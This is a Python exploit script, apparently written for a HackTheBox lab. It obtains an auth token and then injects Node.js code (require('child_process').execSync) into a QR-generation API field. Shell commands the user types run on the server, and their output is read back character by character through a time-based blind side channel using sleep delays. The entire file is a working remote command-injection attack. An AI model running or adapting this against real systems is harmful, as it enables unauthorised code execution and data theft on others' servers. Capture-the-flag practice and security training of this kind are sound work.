import requests
import json

# set server and port
server = "94.237.55.124"
port = 50274
url = f"http://{server}:{port}"
auth_endpoint = f"{url}/api/auth/authenticate"
qr_endpoint = f"{url}/api/service/generate"

# set headers and data for authentication
headers = {"Content-Type": "application/json"}
data = {"email": "test@hackthebox.com"}

# Get admin token
print("Authenticating...")
response = requests.post(auth_endpoint, headers=headers, data=json.dumps(data))
token = response.json()['token']
print("Authentication successful!")

while True:
    # Get input command from user input
    user_input = input("\n> ")
    user_input = user_input.replace("'", '"')
    i = 0

    while True:
        i += 1
        # loop over entire printable ASCII
        for j in range(32, 127):
            # inject command into payload
            payload = {
                "text": "'}) + require('child_process').execSync('" + user_input + " | head -c " + str(i) + " | tail -c 1 | { read c; if [ \"$c\" = \"" + chr(j) + "\" ]; then sleep 2; fi; }')//"}

            # escape backslashes
            payload = json.dumps(payload).replace("\\\\", "\\\\\\")

            # send payload to server
            headers = {"Content-Type": "application/json",
                       "Authorization": f"Bearer {token}"}  # Fixed: added space after Bearer
            try:
                response = requests.post(
                    qr_endpoint, headers=headers, data=payload, timeout=3)
                
                # check if response took 2 seconds or more
                if response.elapsed.total_seconds() >= 2:
                    # print character and break loop
                    print(chr(j), end="", flush=True)
                    break
            except requests.exceptions.Timeout:
                # If timeout occurred (sleep executed)
                print(chr(j), end="", flush=True)
                break
            except Exception as e:
                # Other errors
                continue
        else:
            # if no character was found, break loop
            print()  # New line
            break